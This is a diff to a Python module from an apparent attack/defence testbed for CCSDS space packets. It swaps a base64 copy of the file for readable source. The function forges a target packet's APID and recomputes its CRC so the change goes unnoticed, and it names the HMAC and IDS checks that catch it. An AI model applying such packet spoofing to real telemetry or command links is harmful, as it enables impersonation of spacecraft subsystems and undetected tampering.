@@ -1,1 +1,69 @@
-IyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgYWx0ZXJfYXBpZC5weSDigJMgQXR0YXF1ZSAyIC8gVmVjdGV1ciAxIDogVXN1cnBhdGlvbiBkJ0FQSUQKIwojIFJlbXBsYWNlIGwnQVBJRCAoQXBwbGljYXRpb24gUHJvY2VzcyBJRCkgZCd1biBwYXF1ZXQgQ0NTRFMKIyBjaWJsw6kgcGFyIHVuIGZhdXggQVBJRCwgcHVpcyByZWNhbGN1bGUgbGUgQ1JDIHBvdXIgbWFzcXVlcgojIGwnYWx0w6lyYXRpb24uIFNhbnMgSE1BQywgbGUgcsOpY2VwdGV1ciBhY2NlcHRlIGxhIHRyYW1lLgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCmltcG9ydCBzeXMKaW1wb3J0IG9zCgpzeXMucGF0aC5pbnNlcnQoMCwgb3MucGF0aC5qb2luKG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXyksICIuLiIsICIuLiIpKQpmcm9tIHNyYy5yZWNlaXZlci5mcmFtZVBhcnNlciBpbXBvcnQgcGFyc2VTdHJlYW0KZnJvbSBzcmMuYXR0YWNrcy5fdXRpbHMgaW1wb3J0IHJlYnVpbGRQYWNrZXQsIG9mZnNldEluU3RyZWFtCgoKZGVmIGFsdGVyQXBpZCgKICAgIHJhd1N0cmVhbTogYnl0ZXMsCiAgICB0YXJnZXRTZXE6IGludCwKICAgIGZha2VBcGlkOiBpbnQsCiAgICB2ZXJib3NlOiBib29sID0gVHJ1ZSwKKSAtPiBieXRlczoKICAgICIiIgogICAgUmVtcGxhY2UgbCdBUElEIGQndW4gcGFxdWV0IHBhciB1biBBUElEIGZvcmfDqSwgQ1JDIHJlY2FsY3Vsw6kuCgogICAgTCdBUElEIGlkZW50aWZpZSBsYSBzb3VyY2UgYXBwbGljYXRpdmUgZHUgcGFxdWV0LiBVbiBhdHRhcXVhbnQKICAgIHF1aSB1c3VycGUgbCdBUElEIHBldXQgZmFpcmUgcGFzc2VyIHVuIHBhcXVldCBtYWx2ZWlsbGFudCBwb3VyCiAgICB1biBwYXF1ZXQgbMOpZ2l0aW1lIGQndW4gYXV0cmUgc3lzdMOobWUuCgogICAgQXJnczoKICAgICAgICByYXdTdHJlYW06ICBGbHV4IGRlIHBhcXVldHMgQ0NTRFMgYnJ1dHMuCiAgICAgICAgdGFyZ2V0U2VxOiAgc2VxQ291bnQgZHUgcGFxdWV0IMOgIGFsdMOpcmVyLgogICAgICAgIGZha2VBcGlkOiAgIFZhbGV1ciBkJ0FQSUQgZm9yZ8OpZSAoMOKAkzIwNDcpLgogICAgICAgIHZlcmJvc2U6ICAgIEFmZmljaGVyIHVuIGxvZyBkZSBsJ2FsdMOpcmF0aW9uLgoKICAgIFJldHVybnM6CiAgICAgICAgRmx1eCBtb2RpZmnDqSBhdmVjIGxlIHBhcXVldCBhbHTDqXLDqSBldCBDUkMgcmVjb21wdXRlZC4KCiAgICBEw6l0ZWN0aW9uIChEw6lmZW5zZSAyKSA6CiAgICAgICAg4oaSIEhNQUNfRkFJTCAgIDogbGUgY29udGVudSBkdSBwYXF1ZXQgbmUgY29ycmVzcG9uZCBwbHVzIGF1IHRhZwogICAgICAgIOKGkiBBUElEX1NQT09GICA6IGwnSURTIHN0cnVjdHVyZWwgc2lnbmFsZSB1biBBUElEIGluYXR0ZW5kdQogICAgIiIiCiAgICBwYWNrZXRzID0gcGFyc2VTdHJlYW0ocmF3U3RyZWFtKQogICAgcmVzdWx0ICA9IGJ5dGVhcnJheShyYXdTdHJlYW0pCgogICAgZm9yIHBrdCBpbiBwYWNrZXRzOgogICAgICAgIGlmIHBrdFsic2VxQ291bnQiXSAhPSB0YXJnZXRTZXE6CiAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgIG9mZnNldCA9IG9mZnNldEluU3RyZWFtKHBhY2tldHMsIHRhcmdldFNlcSkKICAgICAgICBuZXdQa3QgPSByZWJ1aWxkUGFja2V0KAogICAgICAgICAgICBhcGlkICAgICAgID0gZmFrZUFwaWQsCiAgICAgICAgICAgIHNlcUZsYWdzICAgPSBwa3RbInNlcUZsYWdzIl0sCiAgICAgICAgICAgIHNlcUNvdW50ICAgPSBwa3RbInNlcUNvdW50Il0sCiAgICAgICAgICAgIHZlcnNpb24gICAgPSBwa3RbInZlcnNpb24iXSwKICAgICAgICAgICAgcGFja2V0VHlwZSA9IHBrdFsicGFja2V0VHlwZSJdLAogICAgICAgICAgICBzZWNIZHJGbGFnID0gcGt0WyJzZWNIZHJGbGFnIl0sCiAgICAgICAgICAgIHBheWxvYWQgICAgPSBwa3RbInBheWxvYWQiXSwKICAgICAgICApCiAgICAgICAgcmVzdWx0W29mZnNldCA6IG9mZnNldCArIHBrdFsidG90YWxTaXplIl1dID0gbmV3UGt0CgogICAgICAgIGlmIHZlcmJvc2U6CiAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgZiJbQTIvYWx0ZXJBcGlkXSBzZXFDb3VudD17dGFyZ2V0U2VxfSA6ICIKICAgICAgICAgICAgICAgIGYiQVBJRCB7cGt0WydhcGlkJ119IOKGkiB7ZmFrZUFwaWR9ICAoQ1JDIHJlY29tcHV0ZWQpIgogICAgICAgICAgICApCiAgICAgICAgYnJlYWsKCiAgICByZXR1cm4gYnl0ZXMocmVzdWx0KQo=
+# =============================================================
+# alter_apid.py – Attaque 2 / Vecteur 1 : Usurpation d'APID
+#
+# Remplace l'APID (Application Process ID) d'un paquet CCSDS
+# ciblé par un faux APID, puis recalcule le CRC pour masquer
+# l'altération. Sans HMAC, le récepteur accepte la trame.
+# =============================================================
+
+import sys
+import os
+
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
+from src.receiver.frame_parser import parse_stream
+from src.attacks._utils import rebuildPacket, offsetInStream
+
+
+def alterApid(
+    rawStream: bytes,
+    targetSeq: int,
+    fakeApid: int,
+    verbose: bool = True,
+) -> bytes:
+    """
+    Remplace l'APID d'un paquet par un APID forgé, CRC recalculé.
+
+    L'APID identifie la source applicative du paquet. Un attaquant
+    qui usurpe l'APID peut faire passer un paquet malveillant pour
+    un paquet légitime d'un autre système.
+
+    Args:
+        rawStream:  Flux de paquets CCSDS bruts.
+        targetSeq:  seqCount du paquet à altérer.
+        fakeApid:   Valeur d'APID forgée (0–2047).
+        verbose:    Afficher un log de l'altération.
+
+    Returns:
+        Flux modifié avec le paquet altéré et CRC recomputed.
+
+    Détection (Défense 2) :
+        → HMAC_FAIL   : le contenu du paquet ne correspond plus au tag
+        → APID_SPOOF  : l'IDS structurel signale un APID inattendu
+    """
+    packets = parse_stream(rawStream)
+    result  = bytearray(rawStream)
+
+    for pkt in packets:
+        if pkt["seqCount"] != targetSeq:
+            continue
+
+        offset = offsetInStream(packets, targetSeq)
+        newPkt = rebuildPacket(
+            apid       = fakeApid,
+            seqFlags   = pkt["seqFlags"],
+            seqCount   = pkt["seqCount"],
+            version    = pkt["version"],
+            packetType = pkt["packetType"],
+            secHdrFlag = pkt["secHdrFlag"],
+            payload    = pkt["payload"],
+        )
+        result[offset : offset + pkt["totalSize"]] = newPkt
+
+        if verbose:
+            print(
+                f"[A2/alterApid] seqCount={targetSeq} : "
+                f"APID {pkt['apid']} → {fakeApid}  (CRC recomputed)"
+            )
+        break
+
+    return bytes(result)
